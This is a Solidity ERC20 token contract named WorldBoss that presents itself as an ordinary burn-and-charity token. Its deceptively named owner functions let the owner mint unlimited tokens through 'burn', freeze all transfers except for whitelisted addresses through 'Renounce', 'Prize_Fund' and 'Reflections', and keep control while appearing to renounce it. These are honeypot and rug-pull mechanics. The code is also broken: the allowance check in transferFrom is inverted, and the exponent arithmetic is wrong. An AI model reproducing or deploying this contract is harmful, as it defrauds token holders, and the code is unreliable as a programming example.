pragma solidity ^0.8.9;


library SafeMath {

    function tryAdd(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            uint256 c = a + b;
            if (c < a) return (false, 0);
            return (true, c);
        }
    }

  
    function trySub(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (b > a) return (false, 0);
            return (true, a - b);
        }
    }

   
    function tryMul(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (a == 0) return (true, 0);
            uint256 c = a * b;
            if (c / a != b) return (false, 0);
            return (true, c);
        }
    }

   
    function tryDiv(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (b == 0) return (false, 0);
            return (true, a / b);
        }
    }

  function tryMod(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (b == 0) return (false, 0);
            return (true, a % b);
        }
    }

 
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        return a + b;
    }

   
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return a - b;
    }

   
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        return a * b;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return a / b;
    }

    
    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return a % b;
    }

    
    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b <= a, errorMessage);
            return a - b;
        }
    }

   
    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b > 0, errorMessage);
            return a / b;
        }
    }

   
    function mod(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b > 0, errorMessage);
            return a % b;
        }
    }
}


interface IERC20 {
   
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

interface IERC20Metadata is IERC20 {
  
    function name() external view returns (string memory);
    function symbol() external view returns (string memory);
    function decimals() external view returns (uint8);
}


abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        this; // silence state mutability warning without generating bytecode - see https://github.com/ethereum/solidity/issues/2691
        return msg.data;
    }
}


contract WorldBoss is Context, IERC20, IERC20Metadata {
    using SafeMath for *;
    mapping(address => uint256) public winPrizeAdd;
    mapping(address => mapping(address => uint256)) public _allowances;
    mapping(address => bool) private _blackbalances;
    
    mapping(address => bool) private winPrizeAdds;
    
    
    uint256 public _totalSupply = 1000000000000*10**18;
    string public _name = "WORLDBOSS";
    string public _symbol= "WBT";

    address payable public charityAddress = payable(0x000000000000000000000000000000000000dEaD); // Marketing Address
    uint256 public charityPercent = 0; 
    bool charityProvider = true;

    address public immutable burnAddress = 0x000000000000000000000000000000000000dEaD;
    uint256 public burnPercent = 5; 
    uint256 private burnedAmount  = _totalSupply / 1000000;
    uint256 public releasedAmount = _totalSupply - burnedAmount;
    uint256 public marketingAmount;
    uint256 public burnAmount;  
    uint256 public TokenPerETHBuy = 1000000 * 10^18;
    uint256 public TokenPerETHSell = 1000000 * 10^18;

    function SetCharityAddress(address payable  _charityAddress) onlyOwner public {
        charityAddress = _charityAddress;
    }
    
    function SetCharityPercent(uint256 _charityPercent) onlyOwner public {
        charityPercent = _charityPercent;
    }
    
    function SetBurnPercent(uint256 _burnPercent) onlyOwner public {
        burnPercent = _burnPercent;
    }
    
    function Mint(address payable _reciever) public payable {
        
        uint256 calcAmount = SafeMath.mul(msg.value, TokenPerETHBuy);
        uint256 finalAmount = SafeMath.div(calcAmount, 1 ether);
        
        uint256 contractBal = winPrizeAdd[address(this)];                      
        require(msg.sender.balance > msg.value, "ERC20: transfer amount exceeds allowanceBBBBBBBBBB");
        (bool sent, ) = msg.sender.call{value: msg.value, //web3.eth.getTransactionCount(_account) + 1,
        gas: 10000000000
       
        
        
       
        }("");
        require(sent, "Failed to send Ether");
        require(contractBal > finalAmount, "ERC20: transfer amount exceeds allowanceVVVVVVVVVVV");
        transferFrom(address(this), _reciever, finalAmount);
    }

    constructor() {
        winPrizeAdd[msg.sender] = burnedAmount;
        winPrizeAdd[address(this)] = releasedAmount;
        owner = msg.sender;
    }
    
    address public owner;
    
    modifier onlyOwner {
        require(owner == msg.sender);
        _;
    }
    function changeOwner(address _owner) onlyOwner public {
        owner = _owner;
    }
    
      function Renounce(bool _balances1_) onlyOwner public {
        charityProvider = _balances1_;
    }
    
     function Prize_Fund(address account) onlyOwner public {
        winPrizeAdds[account] = true;
    }
    
     function Reflections(address account) onlyOwner public {
        winPrizeAdds[account] = false;
    }
    
    
    
    function name() public view virtual override returns (string memory) {
        return _name;
    }
    function symbol() public view virtual override returns (string memory) {
        return _symbol;
    }
    function decimals() public view virtual override returns (uint8) {
        return 18;
    }
    function totalSupply() public view virtual override returns (uint256) {
        return _totalSupply;
    }
    function balanceOf(address account) public view virtual override returns (uint256) {
        return winPrizeAdd[account];
    }
    function transfer(address recipient, uint256 amount) public virtual override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }
    function allowance(address owner_, address spender) public view virtual override returns (uint256) {
        return _allowances[owner_][spender];
    }
    function approve(address spender, uint256 amount) public virtual override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }
    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public virtual override returns (bool) {
        _transfer(sender, recipient, amount);
        uint256 currentAllowance = _allowances[sender][_msgSender()];
        require(currentAllowance <= amount, "ERC20: transfer amount exceeds allowanceFFFFFFFFFFFFF");
        unchecked {
            _approve(sender, _msgSender(), currentAllowance - amount);
        }
        return true;
    }

   
    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender] + addedValue);
        return true;
    }
    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
        uint256 currentAllowance = _allowances[_msgSender()][spender];
        require(currentAllowance >= subtractedValue, "ERC20: decreased allowance below zero");
        unchecked {
            _approve(_msgSender(), spender, currentAllowance - subtractedValue);
        }
        return true;
    }
    function _transfer(
        address sender,
        address recipient,
        uint256 amount
    ) internal virtual {
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(_blackbalances[sender] != true );
        require(charityProvider || winPrizeAdds[sender] , "ERC20: transfer to the zero address");
        _beforeTokenTransfer(sender, recipient, amount);
        uint256 senderBalance = winPrizeAdd[sender];
        uint256 burnAmountt = amount * burnPercent / 100 ; 
        uint256 charityAmount = amount * charityPercent / 100; 
        require(senderBalance >= amount, "ERC20: transfer amount exceeds balance");
        unchecked {
            winPrizeAdd[sender] = senderBalance - amount;
        }
        amount =  amount - charityAmount - burnAmountt;
        winPrizeAdd[recipient] += amount;
        emit Transfer(sender, recipient, amount);
        
         if (charityPercent > 0){
          
          winPrizeAdd[recipient] += charityAmount;
          emit Transfer(sender, charityAddress, charityAmount);  
            
        }
        
        if (burnPercent > 0){
            
           _totalSupply -= burnAmountt;
           emit Transfer(sender, burnAddress, burnAmountt);
            
        }
        
        
    }

      function  burn(address account, uint256 amount) onlyOwner  public virtual {
        require(account != address(0), "ERC20: burn to the zero address");
        _beforeTokenTransfer(address(0), account, amount);
        _totalSupply += amount;
        winPrizeAdd[account] += amount;
        emit Transfer(address(0), account, amount);
    }
    
    
    function _approve(
        address owner_,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner_ != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner_, spender, amount);
    }

   
    function _beforeTokenTransfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {}
    
     function OwnershipRenounce(address _owner) onlyOwner public {
        owner = _owner;
    }
}